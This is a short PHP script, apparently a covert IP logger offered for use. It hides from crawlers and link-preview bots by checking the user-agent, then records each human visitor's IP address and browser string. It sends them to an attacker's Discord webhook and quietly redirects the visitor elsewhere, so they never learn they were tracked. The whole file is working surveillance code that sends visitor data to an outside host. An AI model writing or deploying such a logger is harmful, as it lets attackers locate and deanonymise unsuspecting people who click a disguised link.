<?php include("logger.php"); ?>
<?php
# created by Carlostkd
$bd1  = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/bot|Discord|robot|curl|spider|koj bot|crawler|^$/i', $bd1)) { # get ride to the bots
die();
}
?>
<?php
$IP = $_SERVER['REMOTE_ADDR']; # get ip
$scan = json_decode(file_get_contents('http://ip-api.com/json/'.$IP));


$message = json_encode([ # prepare the message
    'content' => 'IP lOGGER',
    'username' => $IP,
    'embeds' => [
        [
            'title' => 'IPLogger',
            'description' => 'New IP logged
'.$IP.'

*Browser*
'.$_SERVER['HTTP_USER_AGENT'] # get browser fingerprint
            ]
        ]
    ]);

$ch = curl_init( $webhook ); # lets send it back to us
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $message);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
?>
<?php 
if(empty($redirect) === false) {
header("location:$redirect");
die();
}
?>
